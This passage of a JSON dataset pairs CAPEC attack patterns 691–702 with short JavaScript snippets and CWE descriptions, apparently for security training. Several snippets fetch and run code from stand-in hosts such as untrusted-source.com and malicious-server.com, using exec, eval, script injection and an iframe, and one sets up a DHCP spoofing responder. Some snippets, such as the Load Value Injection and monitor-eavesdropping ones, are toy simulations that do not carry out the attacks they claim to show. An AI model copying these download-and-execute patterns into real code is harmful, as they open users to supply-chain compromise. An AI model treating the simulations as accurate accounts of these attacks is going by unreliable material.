        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\nconst url = 'https://untrusted-source.com/malicious-package.tar.gz';\nconst filePath = '/tmp/malicious-package.tar.gz';\n\nhttps.get(url, (response) => {\n  if (response.statusCode === 200) {\n    const file = fs.createWriteStream(filePath);\n    response.pipe(file);\n    file.on('finish', () => {\n      file.close(() => {\n        console.log('Downloaded and saved malicious package without integrity check.');\n        // Simulate execution of the downloaded package\n        require('child_process').exec(`tar -xzf ${filePath} -C /tmp && /tmp/malicious-package/install.sh`, (err) => {\n          if (err) throw err;\n          console.log('Malicious package installed.');\n        });\n      });\n    });\n  } else {\n    console.log('Failed to download package.');\n  }\n}).on('error', (err) => {\n  console.error(`Error: ${err.message}`);\n});",
        "description": "This JavaScript code snippet demonstrates a scenario where an application downloads and executes a package from an untrusted source without performing any integrity checks. The code uses the 'https' module to download a file from a specified URL and saves it to a temporary directory. It then simulates the execution of the downloaded package using the 'child_process' module. This example embodies the CAPEC 'Spoof Open-Source Software Metadata' by showing how an adversary could spoof metadata to make a malicious package appear legitimate. The code also highlights related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-348 (Use of Less Trusted Source), and CWE-506 (Embedded Malicious Code)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// CWE-494: Download code without integrity check\nhttps.get('https://malicious-source.com/repo/commit-metadata.json', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-527: Exposure of repository to unauthorized control sphere\n    fs.writeFileSync('/path/to/local/repo/commit-metadata.json', data);\n    console.log('Commit metadata updated from remote source.');\n  });\n}).on('error', (err) => {\n  console.error('Error downloading commit metadata:', err.message);\n});\n\n// CWE-540: Inclusion of sensitive information in source code\nconst sensitiveInfo = 'API_KEY=12345';\nfs.writeFileSync('/path/to/local/repo/.env', sensitiveInfo);\nconsole.log('Sensitive information written to .env file.');",
        "description": "This JavaScript code snippet demonstrates a scenario where an application downloads commit metadata from a remote source without verifying its integrity (CWE-494). The downloaded metadata is then written to a local repository, potentially exposing it to unauthorized control (CWE-527). Additionally, the code includes sensitive information directly in the source code (CWE-540). This setup can deceive users into believing that the repository is frequently maintained and originates from a trusted source, embodying the main idea of the CAPEC 'Spoof Version Control System Commit Metadata'."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code without integrity check\nfunction downloadAndExecute(url) {\n  https.get(url, (res) => {\n    let data = '';\n    res.on('data', (chunk) => { data += chunk; });\n    res.on('end', () => {\n      // Directly execute the downloaded code\n      eval(data);\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading the file:', err);\n  });\n}\n\n// URL of the malicious package, spoofed to appear popular and trusted\nconst maliciousUrl = 'https://example.com/malicious-package.js';\n\n// Download and execute the malicious package\ndownloadAndExecute(maliciousUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote URL without performing any integrity checks. The `downloadAndExecute` function uses the `https` module to fetch code from a specified URL and then directly executes it using `eval`. This embodies the main idea of the CAPEC 'StarJacking', where an adversary spoofs software popularity metadata to deceive users into downloading and executing a malicious package. The code also touches on related CWEs: CWE-494 (Download of Code Without Integrity Check), CWE-506 (Embedded Malicious Code), and CWE-348 (Use of Less Trusted Source). The URL `https://example.com/malicious-package.js` represents a spoofed, seemingly popular and trusted source, but actually hosts malicious code."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "const http = require('http');\nconst os = require('os');\n\nhttp.createServer((req, res) => {\n  const sensitiveInfo = {\n    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,\n    language: req.headers['accept-language'],\n    keyboardLayout: os.type() === 'Windows_NT' ? 'US' : 'Unknown' // Simplified assumption\n  };\n\n  // CWE-497: Exposure of Sensitive System Information\n  res.writeHead(200, {'Content-Type': 'application/json'});\n  res.end(JSON.stringify(sensitiveInfo));\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code creates an HTTP server that exposes sensitive system information such as timezone, language, and a simplified keyboard layout. The code demonstrates the CAPEC concept of 'System Location Discovery' by collecting and exposing geographical and system-specific information. It also touches on CWE-497 by improperly exposing sensitive system information to unauthorized users. The server listens on port 8080 and responds with the sensitive information in JSON format when accessed."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "const https = require('https');\nconst fs = require('fs');\n\n// Vulnerable function to download and execute code from a remote repository\nfunction downloadAndExecute(repoUrl) {\n  https.get(repoUrl, (res) => {\n    let code = '';\n    res.on('data', (chunk) => {\n      code += chunk;\n    });\n    res.on('end', () => {\n      // Directly executing the downloaded code without integrity check\n      eval(code);\n    });\n  }).on('error', (err) => {\n    console.error('Error downloading code:', err);\n  });\n}\n\n// Example usage\nconst repoUrl = 'https://example.com/malicious-repo.js';\ndownloadAndExecute(repoUrl);",
        "description": "This JavaScript code snippet demonstrates a vulnerable function that downloads and executes code from a remote repository. The function `downloadAndExecute` takes a URL as an argument, downloads the code from that URL, and directly executes it using `eval`. This embodies the main idea of 'Repo Jacking' (CAPEC) by showing how an adversary could exploit the redirect property of VCS repositories to trick users into incorporating malicious code. The code also highlights related CWEs: CWE-494 (Download of Code Without Integrity Check) by not verifying the integrity of the downloaded code, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by importing code from an untrusted source, and CWE-426 (Untrusted Search Path) by potentially using an externally-supplied URL that could point to malicious resources."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "function loadValueInjection() {\n  let secret = 'SensitiveData';\n  let buffer = new ArrayBuffer(64);\n  let view = new DataView(buffer);\n  let attackerControlledData = 0xdeadbeef;\n\n  // Simulate a page fault or microcode assist\n  try {\n    // Transient execution: incorrect data forwarding\n    view.setUint32(0, attackerControlledData, true);\n    let transientData = view.getUint32(0, true);\n\n    // Use side-channel analysis to infer the secret\n    if (transientData === attackerControlledData) {\n      console.log('Secret data leaked:', secret);\n    }\n  } catch (e) {\n    // Handle the fault\n    console.error('Page fault or microcode assist occurred');\n  }\n}\n\nloadValueInjection();",
        "description": "This JavaScript code snippet simulates a Load Value Injection (LVI) attack, where an attacker exploits a hardware design flaw in a CPU's transient instruction execution. The code sets up a scenario where attacker-controlled data is transiently forwarded due to a simulated page fault or microcode assist. The attacker then uses side-channel analysis to infer sensitive information (represented by the 'secret' variable). This example embodies the main idea of CAPEC-1342, CAPEC-1423, CAPEC-1422, and CAPEC-1421 by demonstrating how incorrect data forwarding and shared microarchitectural state can lead to the exposure of sensitive information."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "const dgram = require('dgram');\nconst server = dgram.createSocket('udp4');\n\nserver.on('message', (msg, rinfo) => {\n  const spoofedResponse = Buffer.from('Spoofed DHCP Response');\n  server.send(spoofedResponse, 0, spoofedResponse.length, rinfo.port, rinfo.address, (err) => {\n    if (err) console.error('Error sending spoofed response:', err);\n    else console.log('Sent spoofed response to', rinfo.address);\n  });\n});\n\nserver.bind(67, () => {\n  console.log('DHCP Spoofing server listening on port 67');\n});",
        "description": "This JavaScript code snippet demonstrates a basic DHCP spoofing attack using the 'dgram' module to create a UDP server. The server listens for incoming DHCP requests on port 67. When a message is received, it sends back a spoofed DHCP response to the client. This embodies the main idea of CAPEC-290, where an adversary masquerades as a legitimate DHCP server to redirect network traffic or deny service. The code also touches on related CWEs such as CWE-923 (Improper Restriction of Communication Channel to Intended Endpoints) and CWE-290 (Authentication Bypass by Spoofing), as it does not verify the legitimacy of the incoming requests and sends spoofed responses without proper authentication."
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "function loadMaliciousExtension() {\n  const script = document.createElement('script');\n  script.src = 'http://untrusted-source.com/malicious.js';\n  document.head.appendChild(script);\n}\n\n// Simulate user action to install the extension\nloadMaliciousExtension();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Install Malicious Extension' by dynamically loading a script from an untrusted source. The function 'loadMaliciousExtension' creates a new script element and sets its source to a URL that points to a potentially malicious script. This script is then appended to the document's head, effectively installing the malicious extension. This example embodies several related CWEs: CWE-494 (Download of Code Without Integrity Check) as it fetches code from an unverified source, CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it includes executable functionality from an untrusted source, and CWE-507 (Trojan Horse) as the script could contain hidden malicious code."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "const sensitiveData = 'UserPassword123';\n\n// Simulate cleartext transmission of sensitive information\nfunction transmitData(data) {\n  console.log('Transmitting data:', data); // CWE-319: Cleartext Transmission\n}\n\n// Simulate improper protection of physical side channels\nfunction emitElectromagneticSignal(data) {\n  console.log('Emitting EME for data:', data); // CWE-1300: Improper Protection of Physical Side Channels\n}\n\n// Simulate covert storage channel\nfunction covertStorage(data) {\n  let covertChannel = [];\n  for (let i = 0; i < data.length; i++) {\n    covertChannel.push(data.charCodeAt(i)); // CWE-515: Covert Storage Channel\n  }\n  return covertChannel;\n}\n\n// Simulate improper management of sensitive trace data\nfunction storeTraceData(data) {\n  let traceData = data.split('').map(char => char.charCodeAt(0));\n  console.log('Storing trace data:', traceData); // CWE-1323: Improper Management of Sensitive Trace Data\n}\n\n// Main function to demonstrate the vulnerability\nfunction main() {\n  transmitData(sensitiveData);\n  emitElectromagneticSignal(sensitiveData);\n  let covertData = covertStorage(sensitiveData);\n  storeTraceData(sensitiveData);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Eavesdropping on a Monitor'. The 'transmitData' function simulates the cleartext transmission of sensitive information (CWE-319). The 'emitElectromagneticSignal' function represents the emission of electromagnetic signals that can be intercepted (CWE-1300). The 'covertStorage' function simulates a covert storage channel where data is stored in an unintended manner (CWE-515). The 'storeTraceData' function demonstrates improper management of sensitive trace data (CWE-1323). Together, these functions illustrate how sensitive information can be exposed through various side channels, aligning with the main idea of the CAPEC."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "const net = require('net');\n\nconst trustedNetwork = '192.168.1.0/24';\nconst untrustedNetwork = '10.0.0.0/24';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)\n    if (isTrustedEndpoint(socket.remoteAddress)) {\n      // Trust Boundary Violation (CWE-501)\n      const message = JSON.parse(data);\n      if (message.type === 'bridgeRequest') {\n        // Improper Access Control in Fabric Bridge (CWE-1317)\n        bridgeNetworks(message.source, message.destination);\n      }\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0');\n\nfunction isTrustedEndpoint(ip) {\n  // Simplified check for trusted network\n  return ip.startsWith('192.168.1.');\n}\n\nfunction bridgeNetworks(source, destination) {\n  // Channel Accessible by Non-Endpoint (CWE-300)\n  const client = new net.Socket();\n  client.connect(8080, destination, () => {\n    client.write(`Bridging from ${source} to ${destination}`);\n  });\n}\n",
        "description": "This JavaScript code snippet creates a TCP server that listens for incoming connections. It checks if the incoming connection is from a trusted network (192.168.1.0/24). If the connection is trusted, it processes the data assuming it is a JSON message. If the message type is 'bridgeRequest', it attempts to bridge networks by connecting to the destination specified in the message. This code embodies the main idea of the CAPEC 'Network Boundary Bridging' by demonstrating how an adversary could exploit improper access control and trust boundary violations to bridge trusted and untrusted networks. The code also highlights several related CWEs, such as improper restriction of communication channels, trust boundary violations, and channels accessible by non-endpoints."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "const remoteDesktopUrl = 'http://malicious-server.com/remote-desktop';\n\nfunction loadRemoteDesktop() {\n  const iframe = document.createElement('iframe');\n  iframe.src = remoteDesktopUrl;\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  document.body.appendChild(iframe);\n}\n\n// Simulate user action to load the remote desktop\nwindow.onload = function() {\n  loadRemoteDesktop();\n};",
        "description": "This JavaScript code snippet demonstrates a Browser in the Middle (BiTM) attack. When the victim's browser loads the page, it creates an iframe that points to a remote desktop session hosted on a malicious server. This iframe takes up the entire browser window, effectively establishing a remote desktop connection to the adversary's system without the victim's knowledge. The code leverages CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by embedding an iframe from an untrusted domain. Additionally, it can be extended to exploit CWE-294 (Authentication Bypass by Capture-replay) and CWE-345 (Insufficient Verification of Data Authenticity) by capturing and replaying authentication tokens or failing to verify the authenticity of the remote desktop session."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent {\n  constructor() {\n    this.debugAccess = false;\n  }\n\n  enableDebug() {\n    if (this.checkAuthorization()) {\n      this.debugAccess = true;\n      console.log('Debug access enabled');\n    } else {\n      console.log('Unauthorized access attempt');\n    }\n  }\n\n  checkAuthorization() {\n    // Incorrectly assumes authorization for a group of functionalities\n    return true; // Vulnerable: Always returns true\n  }\n\n  accessInternalRegister() {\n    if (this.debugAccess) {\n      console.log('Accessing internal register');\n      // Access internal register logic\n    } else {\n      console.log('No debug access');\n    }\n  }\n\n  injectError() {\n    if (this.debugAccess) {\n      console.log('Injecting error');\n      // Error injection logic\n    } else {\n      console.log('No debug access');\n    }\n  }\n}\n\nconst debugComponent = new DebugComponent();\ndebugComponent.enableDebug();\ndebugComponent.accessInternalRegister();\ndebugComponent.injectError();",
        "description": "This JavaScript code snippet represents a simplified version of a hardware debug component with incorrect chaining or granularity of debug functionalities. The `DebugComponent` class has methods to enable debug access, check authorization, access internal registers, and inject errors. The `checkAuthorization` method incorrectly assumes authorization for a group of functionalities by always returning true, which is a vulnerability. This allows unauthorized access to debug functionalities, such as accessing internal registers and injecting errors, embodying the main idea of the CAPEC and related CWEs."
    }
]